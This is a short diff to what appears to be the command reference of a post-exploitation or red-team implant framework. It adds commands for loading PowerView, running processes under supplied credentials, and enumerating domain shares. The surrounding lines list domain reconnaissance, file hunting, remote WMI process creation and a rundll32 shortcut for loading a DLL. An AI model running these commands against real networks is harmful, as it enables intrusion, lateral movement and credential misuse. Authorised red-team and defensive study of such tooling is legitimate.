@@ -68,6 +68,10 @@ get-content c:\\temp\\log.txt
 get-userinfo
 get-computerinfo
 get-dodgyprocesses
+sharpps get-process
+pslo powerview.ps1
+runas <user> <password> <os command> <domain> <timeout> <logontype>
+runasps <domain> <user> <password> <ps command>
 pwd
 kill-process 1890
 create-lnk c:\\users\\public\\test.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\test.dll,VoidFunc
@@ -148,6 +152,7 @@ sharpview Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties sama
 sharpview Find-InterestingFile -Path c:\\users\\ -Include *exe*
 sharpview Find-InterestingDomainShareFile -ComputerName SERVER01
 sharpview Get-DomainComputer -SearchBase "OU=Domain Controllers,DC=contoso,DC=local" -Properties samaccountname
+sharpview Get-NetShare -ComputerName SERVER01
 sharpwmi action=query query="select * from win32_process"
 sharpwmi action=query query="select * from win32_process where name='explorer.exe'" computername=SERVER01,SERVER02
 sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02
